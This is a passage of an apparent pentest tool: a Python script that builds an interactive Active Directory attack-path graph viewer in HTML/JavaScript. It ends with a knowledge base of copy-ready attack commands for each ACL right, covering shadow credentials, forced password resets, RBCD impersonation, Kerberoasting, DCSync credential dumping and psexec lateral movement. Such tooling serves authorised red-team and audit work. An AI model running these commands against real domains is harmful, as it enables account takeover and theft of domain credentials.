  else { const tgt=(q==="dc")?dcSet:daSet; const r=pathsTo(tgt);
         r.nodes.forEach(i=>vis.add(i)); r.edges.forEach(e=>PATHSET.add(e)); tgt.forEach(t=>vis.add(t)); }
  // For DA/DC/High-value, never leave the operator staring at a blank canvas.
  // For "none" (boot) and "owned" we intentionally allow an empty set — owned is
  // whatever the operator has marked, and an empty graph is the desired start.
  if(vis.size<1 && q!=="none" && q!=="owned"){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,15).forEach(i=>vis.add(i)); }
  [...vis].forEach(i=>{const a=Math.random()*6.28,rad=120+Math.random()*260;
    N[i].x=Math.cos(a)*rad; N[i].y=Math.sin(a)*rad; N[i].vx=N[i].vy=0; N[i].fx=N[i].fy=null;});
  refresh(); if(typeof select==="function") select(-1);
  document.querySelectorAll('#dock .q').forEach(b=>b.classList.toggle('active', b.dataset.q===q));
  if(typeof updateHint==="function") updateHint(q);
  if(typeof warmup==="function") warmup();
}
// NOTE: do NOT call applyView() here. select(-1) (reached via applyView)
// assigns to `let sel`, which is still in its temporal dead zone at this
// point in parsing → a ReferenceError would abort the entire script and
// leave a blank canvas. The boot block at the bottom calls applyView().

const cv=document.getElementById("c"), ctx=cv.getContext("2d");
let W=0,Hh=0,DPR=Math.min(window.devicePixelRatio||1,2);
function resize(){W=innerWidth;Hh=innerHeight;cv.width=W*DPR;cv.height=Hh*DPR;cv.style.width=W+"px";cv.style.height=Hh+"px";ctx.setTransform(DPR,0,0,DPR,0,0);requestDraw();}
addEventListener("resize",resize);

let scale=1, tx=0, ty=0, alpha=1;
function toScreen(x,y){return [x*scale+tx, y*scale+ty];}
function toWorld(px,py){return [(px-tx)/scale,(py-ty)/scale];}

// ---- physics over the VISIBLE set only (bounded cost) ----------------------
function step(){
  if(alpha<0.02) return false;
  const arr=visArr, m=arr.length;
  // more breathing room as the set grows → no clumping
  const GRAV = 0.0016, LINK = 150 + Math.min(m*1.5, 120);
  for(let a=0;a<m;a++){const A=N[arr[a]]; if(A.fx!=null)continue;
    for(let b=a+1;b<m;b++){const B=N[arr[b]];
      let dx=A.x-B.x, dy=A.y-B.y, d2=dx*dx+dy*dy+0.01; if(d2>500000)continue;
      let d=Math.sqrt(d2), ux=dx/d, uy=dy/d;
      let f=3400/d2;                                  // base repulsion
      const mind=A.r+B.r+26;                          // hard anti-overlap
      if(d<mind) f += (mind-d)*0.9;
      A.vx+=ux*f;A.vy+=uy*f; B.vx-=ux*f;B.vy-=uy*f;}}
  VE.forEach(ei=>{const e=E[ei],A=N[e.s],B=N[e.t]; let dx=B.x-A.x,dy=B.y-A.y;
    let d=Math.sqrt(dx*dx+dy*dy)||1; const f=(d-LINK)*0.018, ux=dx/d, uy=dy/d;
    A.vx+=ux*f;A.vy+=uy*f; B.vx-=ux*f;B.vy-=uy*f;});
  let mx=0;
  arr.forEach(i=>{const n=N[i];
    n.vx+=-n.x*GRAV; n.vy+=-n.y*GRAV;                // gentle centering, no drift
    if(n.fx!=null){n.x=n.fx;n.y=n.fy;n.vx=n.vy=0;return;}
    n.vx*=0.84; n.vy*=0.84;
    if(n.vx>50)n.vx=50; else if(n.vx<-50)n.vx=-50;  // clamp → never explodes
    if(n.vy>50)n.vy=50; else if(n.vy<-50)n.vy=-50;
    n.x+=n.vx*alpha; n.y+=n.vy*alpha; mx=Math.max(mx,Math.abs(n.vx)+Math.abs(n.vy));});
  alpha*=0.985;
  return alpha>=0.02 && mx>0.4;                      // tells the loop when to stop
}

// ---- render-on-demand loop: runs only while moving, then idles at 0% CPU ---
let running=false;
function tick(){ const moving=step(); draw(); if(moving) requestAnimationFrame(tick); else running=false; }
function requestDraw(){ if(!running){ running=true; requestAnimationFrame(tick); } }
function reheat(){ alpha=Math.max(alpha,0.7); requestDraw(); }

let hover=-1, sel=-1;
function draw(){
  ctx.clearRect(0,0,W,Hh);
  const active = sel>=0?sel:hover;
  const lit = active>=0 ? nb[active] : null;

  VE.forEach(ei=>{
    const e=E[ei], a=N[e.s], b=N[e.t];
    const [ax,ay]=toScreen(a.x,a.y),[bx,by]=toScreen(b.x,b.y);
    const rel = active>=0 && (e.s===active||e.t===active);
    const onp = PATHSET.size ? PATHSET.has(ei) : e.p;   // view path, else python path
    let col, w, glow=0;
    if(onp){col="rgba(255,45,109,.92)";w=2.1;glow=10;}
    else if(rel){col="rgba(159,203,255,.85)";w=1.7;glow=5;}
    else if(active>=0){col="rgba(120,130,150,.06)";w=1;}
    else {col="rgba(130,142,165,.22)";w=1;}
    const mx=(ax+bx)/2, my=(ay+by)/2, dx=bx-ax, dy=by-ay;
    const cx=mx-dy*0.12, cy=my+dx*0.12;
    ctx.beginPath(); ctx.moveTo(ax,ay); ctx.quadraticCurveTo(cx,cy,bx,by);
    ctx.strokeStyle=col; ctx.lineWidth=w;
    ctx.shadowBlur=glow; ctx.shadowColor=onp?"#ff2d6d":"#9fcbff";
    ctx.stroke(); ctx.shadowBlur=0;
    if(onp||rel){const ang=Math.atan2(by-cy,bx-cx), r=N[e.t].r+3;
      const ex=bx-Math.cos(ang)*r, ey=by-Math.sin(ang)*r, s=6;
      ctx.beginPath(); ctx.moveTo(ex,ey);
      ctx.lineTo(ex-Math.cos(ang-0.4)*s,ey-Math.sin(ang-0.4)*s);
      ctx.lineTo(ex-Math.cos(ang+0.4)*s,ey-Math.sin(ang+0.4)*s);
      ctx.closePath(); ctx.fillStyle=col; ctx.fill();}
  });

  visArr.forEach(i=>{
    const n=N[i]; const [x,y]=toScreen(n.x,n.y), r=n.r;
    const dim = active>=0 && i!==active && !(lit&&lit.has(i));
    const col=COLORS[n.type]||COLORS.Base;
    ctx.globalAlpha = dim?0.16:1;
    ctx.beginPath(); ctx.arc(x,y,r,0,7);
    ctx.shadowBlur = dim?0:(n.p?16:10); ctx.shadowColor=col;
    ctx.fillStyle=col; ctx.fill(); ctx.shadowBlur=0;
    ctx.beginPath(); ctx.arc(x-r*0.3,y-r*0.3,r*0.42,0,7);
    ctx.fillStyle="rgba(255,255,255,.35)"; ctx.fill();
    ctx.lineWidth=1.3; ctx.strokeStyle="rgba(0,0,0,.5)";
    ctx.beginPath(); ctx.arc(x,y,r,0,7); ctx.stroke();
    if(n.hv && !dim){ctx.beginPath(); ctx.arc(x,y,r+4,0,7);
      ctx.strokeStyle="rgba(255,210,74,.9)"; ctx.lineWidth=2;
      ctx.shadowBlur=8; ctx.shadowColor="#ffd24a"; ctx.stroke(); ctx.shadowBlur=0;}
    if(n.owned && !dim){ctx.beginPath(); ctx.arc(x,y,r+(n.hv?8:3),0,7);
      ctx.strokeStyle="#ff3b3b"; ctx.lineWidth=2; ctx.stroke();
      ctx.font="11px sans-serif"; ctx.fillStyle="#ff5b5b"; ctx.textAlign="center";
      ctx.fillText("☠", x, y-r-(n.hv?10:5));}
    if((scale>0.85 || i===active || (lit&&lit.has(i)) || n.hv || n.owned) && !dim){
      ctx.font="11px Inter,system-ui"; ctx.textAlign="center"; ctx.textBaseline="top";
      const lbl=short(n.label); ctx.lineWidth=3; ctx.strokeStyle="rgba(5,8,14,.85)";
      ctx.strokeText(lbl,x,y+r+3); ctx.fillStyle="#dbe6f3"; ctx.fillText(lbl,x,y+r+3);}
    ctx.globalAlpha=1;
  });
}
function short(s){s=s||""; return s.length>26?s.slice(0,24)+"…":s;}
function updateCount(){const el=document.getElementById("count");
  if(el) el.textContent=visArr.length+" / "+N.length+" shown";}

// fit the visible cluster into view once it settles
let fitted=false;
function fit(){ if(!visArr.length)return;
  let x0=1e9,y0=1e9,x1=-1e9,y1=-1e9;
  visArr.forEach(i=>{const n=N[i]; x0=Math.min(x0,n.x);y0=Math.min(y0,n.y);x1=Math.max(x1,n.x);y1=Math.max(y1,n.y);});
  const w=x1-x0+160, h=y1-y0+160;
  scale=Math.max(0.25,Math.min(1.6, Math.min(W/w,(Hh)/h)));
  tx=W/2-((x0+x1)/2)*scale; ty=Hh/2-((y0+y1)/2)*scale;}

// ---- picking (visible only) ----
function pick(px,py){let best=-1,bd=1e9;
  for(const i of visArr){const [x,y]=toScreen(N[i].x,N[i].y), r=N[i].r+5;
    const d=(px-x)**2+(py-y)**2; if(d<r*r&&d<bd){bd=d;best=i;}} return best;}

// ---- interaction ----
let dragN=-1, panning=false, lastx=0,lasty=0, moved=false;
cv.addEventListener("mousedown",ev=>{const i=pick(ev.clientX,ev.clientY); moved=false;
  if(i>=0){dragN=i;N[i].fx=N[i].x;N[i].fy=N[i].y;reheat();}
  else{panning=true;cv.classList.add("grab");} lastx=ev.clientX;lasty=ev.clientY;});
addEventListener("mousemove",ev=>{
  const dx=ev.clientX-lastx, dy=ev.clientY-lasty; if(Math.abs(dx)+Math.abs(dy)>3)moved=true;
  if(dragN>=0){const [wx,wy]=toWorld(ev.clientX,ev.clientY);N[dragN].fx=wx;N[dragN].fy=wy;N[dragN].x=wx;N[dragN].y=wy;reheat();}
  else if(panning){tx+=dx;ty+=dy;requestDraw();}
  else{const i=pick(ev.clientX,ev.clientY); if(i!==hover){hover=i;requestDraw();}
    const tip=document.getElementById("tip");
    if(i>=0){tip.style.display="block";tip.style.left=(ev.clientX+14)+"px";tip.style.top=(ev.clientY+14)+"px";
      tip.innerHTML="<b>"+esc(N[i].label)+"</b><br><span style='color:#9aa7b8'>"+N[i].type+" · "+deg[i]+" edges · click to expand</span>";
      cv.style.cursor="pointer";}
    else{tip.style.display="none";cv.style.cursor="";}}
  lastx=ev.clientX;lasty=ev.clientY;});
addEventListener("mouseup",ev=>{
  if(dragN>=0){if(!moved){select(dragN);expand(dragN);} N[dragN].fx=null;N[dragN].fy=null;dragN=-1;}
  else if(panning){panning=false;cv.classList.remove("grab"); if(!moved){select(-1);} requestDraw();}
});
cv.addEventListener("wheel",ev=>{ev.preventDefault();const f=ev.deltaY<0?1.12:1/1.12;
  const [wx,wy]=toWorld(ev.clientX,ev.clientY); scale=Math.max(0.15,Math.min(4,scale*f));
  tx=ev.clientX-wx*scale; ty=ev.clientY-wy*scale; requestDraw();},{passive:false});
// Right-click a node → toggle owned (no menu, no file needed).
cv.addEventListener("contextmenu",ev=>{const i=pick(ev.clientX,ev.clientY);
  if(i>=0){ev.preventDefault(); toggleOwned(i);}});

// ---- selection + panel ----
function select(i){sel=i; const p=document.getElementById("panel"); requestDraw();
  if(i<0){p.classList.remove("open");return;}
  const n=N[i]; p.classList.add("open");
  document.getElementById("ptype").textContent=n.type;
  document.getElementById("pname").textContent=n.label;
  let b=""; if(n.hv)b+="<span class='badge hv'>&#9733; HIGH VALUE</span>";
  if(n.owned)b+="<span class='badge owned'>&#9760; OWNED</span>";
  b+="<span class='badge t'>"+deg[i]+" edges</span>";
  b+="<span class='badge own-toggle' id='ownbtn' title='Toggle owned (or press O / right-click the node)'>"+
     (n.owned?"&#9760; unmark owned":"&#9760; mark owned")+"</span>";
  document.getElementById("pbadges").innerHTML=b;
  const ob=document.getElementById("ownbtn"); if(ob) ob.onclick=()=>toggleOwned(i);
  renderBody(i);
}
// Mark/unmark a node as compromised, live. Owned drives the "Owned" view and the
// → Domain Admins / → DC shortest-path queries, so the operator controls the
// whole attack-path picture straight from the graph — no --owned file needed.
function toggleOwned(i){ if(i<0||i==null)return;
  N[i].owned=!N[i].owned; recomputeOwned();
  if(sel===i) select(i);              // refresh the panel badge/button
  if(curView==="owned"||curView==="da"||curView==="dc") applyView(curView);
  requestDraw();
  toast(N[i].owned?"Marked owned ☠":"Unmarked owned");
}
function renderBody(i){
  const n=N[i]; let h="";
  // outbound abusable edges
  const out=E.filter(e=>e.s===i);
  const ab=out.map(e=>abuseCard(i,e)).filter(Boolean);
  h+="<div class='sect'>&#9876; Abuse from this node</div>";
  if(ab.length) h+=ab.join("");
  else h+="<div class='empty'>No directly abusable outbound rights mapped.</div>";
  // inbound (who can pwn this)
  const inc=E.filter(e=>e.t===i && key(e.l) in ABUSE);
  if(inc.length){h+="<div class='sect'>&#9888; Who can take this over</div>";
    inc.slice(0,30).forEach(e=>{h+="<div class='edge'><span class='rt'>"+e.l+"</span> &larr; "+esc(N[e.s].label)+"</div>";});}
  // neighbors
  h+="<div class='sect'>Connections</div>";
  out.slice(0,40).forEach(e=>{h+="<div class='edge'>&rarr; <span class='rt'>"+e.l+"</span> "+esc(N[e.t].label)+"</div>";});
  document.getElementById("pbody").innerHTML=h;
  document.querySelectorAll("#pbody .cmd pre").forEach(pre=>{
    pre.addEventListener("click",()=>copy(pre.getAttribute("data-cmd")));});
}
function abuseCard(si,e){
  const k=key(e.l); const list=ABUSE[k]; if(!list||!list.length) return "";
  const src=N[si], dst=N[e.t]; const dt=(dst.type||"").toLowerCase();
  const rows=list.filter(c=>c.when==="any"||c.when===dt||(c.when==="domain"&&dt==="domain"));
  const use=rows.length?rows:list.filter(c=>c.when==="any")||list;
  if(!use.length) return "";
  let h="<div class='abuse'><div class='ah'><span class='src'>"+esc(short(src.label))+
    "</span> <span class='arrow'>&mdash;"+e.l+"&rarr;</span> <span class='dst'>"+esc(short(dst.label))+"</span></div>";
  use.forEach(c=>{const cmd=sub(c.cmd,src,dst);
    h+="<div class='cmd'><div class='ch'><span class='os "+(c.os==="win"?"win":"linux")+"'>"+
       (c.os==="win"?"WINDOWS":"LINUX")+"</span>"+esc(c.tool)+"</div>"+
       "<pre data-cmd='"+escAttr(cmd)+"'><span class='cp'>copy</span>"+esc(cmd)+"</pre></div>";});
  h+="</div>"; return h;
}
function sub(cmd,src,dst){const sN=nshort(src.label), dN=nshort(dst.label);
  return cmd.replace(/{srcN}/g,sN).replace(/{dstN}/g,dN).replace(/{dom}/g,DOMAIN)
            .replace(/{dcip}/g,DCIP).replace(/{dc}/g,DCHOST);}
function nshort(s){return (s||"").split("@")[0];}
function key(l){return (l||"").toLowerCase().replace(/[^a-z]/g,"");}
function esc(s){return (s+"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
function escAttr(s){return esc(s).replace(/'/g,"&#39;");}
let _toastT=0;
function toast(msg){const e=document.getElementById("toast"); if(!e)return; e.textContent=msg||"copied";
  e.classList.add("show"); clearTimeout(_toastT); _toastT=setTimeout(()=>e.classList.remove("show"),1100);}
function copy(t){navigator.clipboard&&navigator.clipboard.writeText(t);toast("copied");}
document.getElementById("pclose").addEventListener("click",()=>select(-1));

// ---- bring a node (or an edge's two ends) into view + select ----
function recenter(cx,cy){ scale=Math.max(scale,1.1); tx=W/2-cx*scale; ty=Hh/2-cy*scale; }
function focusNode(i){ vis.add(i); nb[i].forEach(j=>vis.add(j)); refresh(); recenter(N[i].x,N[i].y); select(i); reheat(); }
function focusEdge(s,t){ vis.add(s); vis.add(t); nb[s].forEach(j=>vis.add(j)); refresh();
  recenter((N[s].x+N[t].x)/2,(N[s].y+N[t].y)/2); select(s); reheat(); }

// ---- search across ALL nodes with a live results dropdown ----
const q=document.getElementById("q"), results=document.getElementById("results");
let matches=[], rsel=-1;
function renderResults(){
  if(!matches.length){results.classList.remove("show");results.innerHTML="";return;}
  results.innerHTML=matches.slice(0,40).map((i,k)=>{const n=N[i],c=COLORS[n.type]||COLORS.Base;
    const m=(n.owned?"☠ ":"")+(n.hv?"★ ":"");
    return "<div class='r"+(k===rsel?" sel":"")+"' data-i='"+i+"'><span class='d' style='color:"+c+"'></span>"+m+esc(n.label)+"<small>"+n.type+"</small></div>";}).join("");
  results.classList.add("show");
  results.querySelectorAll(".r").forEach(el=>el.addEventListener("mousedown",ev=>{ev.preventDefault();pickResult(+el.dataset.i);}));
}
function pickResult(i){ matches=[]; results.classList.remove("show"); q.value=N[i].label; focusNode(i); }
q.addEventListener("input",()=>{const v=q.value.toLowerCase().trim(); rsel=-1;
  if(!v){matches=[];renderResults();return;}
  matches=[]; for(let i=0;i<N.length;i++){ if((N[i].label||"").toLowerCase().includes(v)) matches.push(i); }
  matches.sort((a,b)=>{const A=(N[a].label||"").toLowerCase(),B=(N[b].label||"").toLowerCase();
    return ((A.startsWith(v)?0:1)-(B.startsWith(v)?0:1)) || (A.length-B.length);});
  renderResults();});
q.addEventListener("keydown",ev=>{
  if(ev.key==="ArrowDown"){rsel=Math.min(rsel+1,matches.length-1);renderResults();ev.preventDefault();}
  else if(ev.key==="ArrowUp"){rsel=Math.max(rsel-1,0);renderResults();ev.preventDefault();}
  else if(ev.key==="Enter"){if(matches.length)pickResult(matches[rsel<0?0:rsel]);}
  else if(ev.key==="Escape"){matches=[];renderResults();q.blur();}});
document.addEventListener("mousedown",ev=>{if(!ev.target.closest("#search")&&!ev.target.closest("#results"))results.classList.remove("show");});

// ---- findings menu: who can abuse what (+ all users) ----
const FRANK={dcsync:0,getchangesall:0,getchanges:0,genericall:1,writedacl:2,writeowner:3,owns:3,
  addkeycredentiallink:4,forcechangepassword:5,allextendedrights:6,writespn:7,addspn:7,addmember:8,addself:8,
  allowedtoact:9,allowedtodelegate:9,synclapspassword:10,adminto:20};
const FA=(()=>{const o=[];E.forEach((e,i)=>{if(key(e.l) in ABUSE)o.push(i);});
  o.sort((a,b)=>((FRANK[key(E[a].l)]??50)-(FRANK[key(E[b].l)]??50))||E[a].l.localeCompare(E[b].l));return o;})();
const findings=document.getElementById("findings"), flist=document.getElementById("flist");
const btnFind=document.getElementById("btnFind"), btnUsers=document.getElementById("btnUsers");
let fmode="";
function buildFindings(f){f=(f||"").toLowerCase();let h="",last="";
  FA.forEach(ei=>{const e=E[ei],s=N[e.s],t=N[e.t];
    if(f && !(s.label+" "+e.l+" "+t.label).toLowerCase().includes(f))return;
    if(e.l!==last){h+="<div class='fg'>"+esc(e.l)+"</div>";last=e.l;}
    h+="<div class='fi' data-s='"+e.s+"' data-t='"+e.t+"'>"+(s.owned?"☠ ":"")+"<span class='src'>"+esc(short(s.label))+"</span> <span class='rt'>&rarr;</span> <span class='dst'>"+esc(short(t.label))+"</span></div>";});
  flist.innerHTML=h||"<div class='fi' style='color:#9aa7b8'>No abusable ACL edges in this dataset.</div>";
  flist.querySelectorAll(".fi[data-s]").forEach(el=>el.addEventListener("click",()=>focusEdge(+el.dataset.s,+el.dataset.t)));}
function buildUsers(f){f=(f||"").toLowerCase();
  const us=[...N.keys()].filter(i=>N[i].type==="User").sort((a,b)=>(N[a].label||"").localeCompare(N[b].label||""));
  let h=""; us.forEach(i=>{const n=N[i]; if(f && !(n.label||"").toLowerCase().includes(f))return;
    h+="<div class='fi' data-i='"+i+"'>"+(n.owned?"<span style='color:#ff5b5b'>☠ </span>":"")+(n.hv?"<span style='color:#ffd24a'>★ </span>":"")+"<span class='src'>"+esc(n.label)+"</span></div>";});
  flist.innerHTML=h||"<div class='fi' style='color:#9aa7b8'>No users.</div>";
  flist.querySelectorAll(".fi[data-i]").forEach(el=>el.addEventListener("click",()=>focusNode(+el.dataset.i)));}
function openFindings(mode){ if(fmode===mode){closeFindings();return;}
  fmode=mode; findings.classList.add("show");
  btnFind.classList.toggle("on",mode==="find"); btnUsers.classList.toggle("on",mode==="users");
  const nUsers=N.filter(n=>n.type==="User").length;
  document.getElementById("findTitle").textContent = mode==="find"?("Abusable ACLs ("+FA.length+")"):("All users ("+nUsers+")");
  document.getElementById("ffilter").value="";
  (mode==="find"?buildFindings:buildUsers)("");}
function closeFindings(){fmode="";findings.classList.remove("show");btnFind.classList.remove("on");btnUsers.classList.remove("on");}
btnFind.addEventListener("click",()=>openFindings("find"));
btnUsers.addEventListener("click",()=>openFindings("users"));
document.getElementById("findClose").addEventListener("click",closeFindings);
document.getElementById("ffilter").addEventListener("input",e=>{(fmode==="find"?buildFindings:buildUsers)(e.target.value);});

// ---- warm up the layout synchronously, then fit (deterministic first paint)
function warmup(iters){ alpha=1; for(let k=0;k<(iters||420);k++) step(); fit(); fitted=true; requestDraw(); }

// ---- VIEW buttons (Owned · → Domain Admins · → DC · High value · Everything)
document.querySelectorAll('#dock .q').forEach(b=>b.addEventListener("click",()=>applyView(b.dataset.q)));

// ---- reset = clear back to the empty start ----
const rb=document.getElementById("reset");
if(rb) rb.addEventListener("click",()=>{ q.value=""; matches=[]; renderResults(); applyView("none"); });
addEventListener("keydown",ev=>{
  if(ev.target&&/^(INPUT|TEXTAREA)$/.test(ev.target.tagName)) return;   // don't hijack the search box
  if(ev.key==="Escape"){select(-1);closeFindings();}
  else if((ev.key==="o"||ev.key==="O") && sel>=0){ toggleOwned(sel); }   // O = mark/unmark selected
});

// ---- empty-state hint: the graph starts blank; this tells the operator how to
// populate it (search / pick a view / mark owned). Hidden as soon as nodes show.
function updateHint(){ const el=document.getElementById("empty"); if(!el)return;
  el.style.display = (visArr.length? "none":"flex"); }   // flex → keeps it centered

// ---- boot: start EMPTY. The operator drives the graph — search a node, pick a
// view, or right-click / press O to mark owned. Nothing is shown until then.
resize(); applyView("none");
</script>
</body>
</html>
'''

# --- Abuse knowledge base: Linux + Windows commands per ACL right ----------
# Placeholders: {srcN}=controlling principal (short), {dstN}=target (short),
#               {dom}=domain, {dc}=DC host/ip
ABUSE = {
 "genericall": [
  {"os":"linux","when":"user","tool":"certipy (Shadow Creds → NT hash)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dcip} -target {dc}"},
  {"os":"linux","when":"user","tool":"bloodyAD (ForceChangePassword)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
  {"os":"win","when":"user","tool":"Whisker (Shadow Creds)","cmd":"Whisker.exe add /target:{dstN}"},
  {"os":"win","when":"user","tool":"PowerView (reset pwd)","cmd":"Set-DomainUserPassword -Identity {dstN} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
  {"os":"linux","when":"group","tool":"bloodyAD (add self)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
  {"os":"win","when":"group","tool":"PowerView (add member)","cmd":"Add-DomainGroupMember -Identity '{dstN}' -Members '{srcN}'"},
  {"os":"linux","when":"computer","tool":"RBCD (impacket+bloodyAD)","cmd":"impacket-addcomputer {dom}/'{srcN}':'<pass>' -computer-name 'PWN$' -computer-pass 'Pwn123!' -dc-ip {dcip} -dc-host {dc} && bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add rbcd '{dstN}' 'PWN$' && impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'PWN$':'Pwn123!' -dc-ip {dcip} -dc-host {dc}"},
  {"os":"win","when":"computer","tool":"RBCD (Powermad+Rubeus)","cmd":"New-MachineAccount -MachineAccount PWN -Password (ConvertTo-SecureString 'Pwn123!' -AsPlainText -Force); Set-ADComputer {dstN} -PrincipalsAllowedToDelegateToAccount PWN$; Rubeus.exe s4u /user:PWN$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstN}.{dom} /ptt"},
 ],
 "genericwrite": [
  {"os":"linux","when":"user","tool":"targetedKerberoast","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dcip} --request-user {dstN}"},
  {"os":"linux","when":"user","tool":"certipy (Shadow Creds)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dcip} -target {dc}"},
  {"os":"win","when":"user","tool":"PowerView (set SPN → roast)","cmd":"Set-DomainObject -Identity {dstN} -Set @{{serviceprincipalname='nonexistent/ADAPwn'}}; Rubeus.exe kerberoast /user:{dstN} /nowrap"},
  {"os":"linux","when":"group","tool":"bloodyAD (add self)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
 ],
 "writedacl": [
  {"os":"linux","when":"any","tool":"impacket-dacledit (grant FullControl)","cmd":"impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dcip}"},
  {"os":"linux","when":"domain","tool":"bloodyAD (grant DCSync)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add genericAll '{dstN}' '{srcN}'  # then DCSync"},
  {"os":"win","when":"any","tool":"PowerView (grant rights)","cmd":"Add-DomainObjectAcl -TargetIdentity '{dstN}' -PrincipalIdentity '{srcN}' -Rights All"},
  {"os":"win","when":"domain","tool":"PowerView (grant DCSync)","cmd":"Add-DomainObjectAcl -TargetIdentity '{dom}' -PrincipalIdentity '{srcN}' -Rights DCSync"},
 ],
 "writeowner": [
  {"os":"linux","when":"any","tool":"impacket-owneredit + dacledit","cmd":"impacket-owneredit -action write -new-owner '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dcip} && impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dcip}"},
  {"os":"win","when":"any","tool":"PowerView (take ownership)","cmd":"Set-DomainObjectOwner -Identity '{dstN}' -OwnerIdentity '{srcN}'; Add-DomainObjectAcl -TargetIdentity '{dstN}' -PrincipalIdentity '{srcN}' -Rights All"},
 ],
 "owns": "writeowner",
 "addkeycredentiallink": [
  {"os":"linux","when":"any","tool":"certipy (Shadow Creds)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dcip} -target {dc}"},
  {"os":"linux","when":"any","tool":"pywhisker","cmd":"pywhisker.py -d {dom} -u '{srcN}' -p '<pass>' --target '{dstN}' --action add --dc-ip {dcip}"},
  {"os":"win","when":"any","tool":"Whisker","cmd":"Whisker.exe add /target:{dstN}"},
 ],
 "forcechangepassword": [
  {"os":"linux","when":"any","tool":"bloodyAD","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
  {"os":"linux","when":"any","tool":"net rpc","cmd":"net rpc password '{dstN}' 'Newp@ss123!' -U {dom}/'{srcN}'%'<pass>' -S {dc}"},
  {"os":"win","when":"any","tool":"PowerView","cmd":"Set-DomainUserPassword -Identity {dstN} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
 ],
 "addmember": [
  {"os":"linux","when":"any","tool":"bloodyAD","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
  {"os":"win","when":"any","tool":"PowerView","cmd":"Add-DomainGroupMember -Identity '{dstN}' -Members '{srcN}'"},
 ],
 "addself": "addmember",
 "allextendedrights": [
  {"os":"linux","when":"user","tool":"bloodyAD (ForceChangePassword)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
  {"os":"linux","when":"domain","tool":"impacket-secretsdump (DCSync)","cmd":"impacket-secretsdump {dom}/'{srcN}':'<pass>'@{dc} -just-dc"},
 ],
 "writespn": [
  {"os":"linux","when":"any","tool":"targetedKerberoast","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dcip} --request-user {dstN}"},
  {"os":"win","when":"any","tool":"PowerView+Rubeus","cmd":"Set-DomainObject -Identity {dstN} -Set @{{serviceprincipalname='nonexistent/ADAPwn'}}; Rubeus.exe kerberoast /user:{dstN} /nowrap"},
 ],
 "addspn": "writespn",
 "allowedtoact": [
  {"os":"linux","when":"any","tool":"impacket-getST (RBCD)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dcip} -dc-host {dc}"},
  {"os":"win","when":"any","tool":"Rubeus s4u","cmd":"Rubeus.exe s4u /user:{srcN} /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstN}.{dom} /ptt"},
 ],
 "allowedtodelegate": [
  {"os":"linux","when":"any","tool":"impacket-getST (constrained deleg)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dcip} -dc-host {dc}"},
 ],
 "dcsync": [
  {"os":"linux","when":"any","tool":"impacket-secretsdump","cmd":"impacket-secretsdump {dom}/'{srcN}':'<pass>'@{dc} -just-dc"},
  {"os":"win","when":"any","tool":"mimikatz","cmd":"lsadump::dcsync /domain:{dom} /user:Administrator"},
 ],
 "getchanges": "dcsync",
 "getchangesall": "dcsync",
 "synclapspassword": [
  {"os":"linux","when":"any","tool":"netexec (read LAPS)","cmd":"nxc ldap {dc} -u '{srcN}' -p '<pass>' --module laps"},
 ],
 "adminto": [
  {"os":"linux","when":"any","tool":"evil-winrm / psexec","cmd":"impacket-psexec {dom}/'{srcN}':'<pass>'@{dstN}.{dom}   # or: evil-winrm -i {dstN} -u {srcN} -p '<pass>'"},
  {"os":"win","when":"any","tool":"PsExec","cmd":"PsExec.exe \\\\{dstN} cmd"},
 ],
}
# resolve string aliases
for k,v in list(ABUSE.items()):
    if isinstance(v,str): ABUSE[k]=ABUSE.get(v,[])

def write_html(payload, meta):
    tpl = HTML_TEMPLATE
    tpl = tpl.replace("__DATA__", json.dumps(payload))
    tpl = tpl.replace("__ABUSE__", json.dumps(ABUSE))
    tpl = tpl.replace("__DOMAIN__", json.dumps(DOM))
    tpl = tpl.replace("__DC__", json.dumps(DC))
    tpl = tpl.replace("__DCIP__", json.dumps(DCIP))
    tpl = tpl.replace("__META__", json.dumps(meta))
    with open(HTML,"w") as f: f.write(tpl)

# ---- load zip -------------------------------------------------------------
files = {}
if ZIP and os.path.exists(ZIP):
    try:
        with zipfile.ZipFile(ZIP) as z:
            for n in z.namelist():
                if n.lower().endswith(".json"):
                    try: files[n] = json.load(z.open(n))
                    except Exception: pass
    except Exception: files = {}

# auto-derive the domain from the zip when it wasn't supplied (standalone mode)
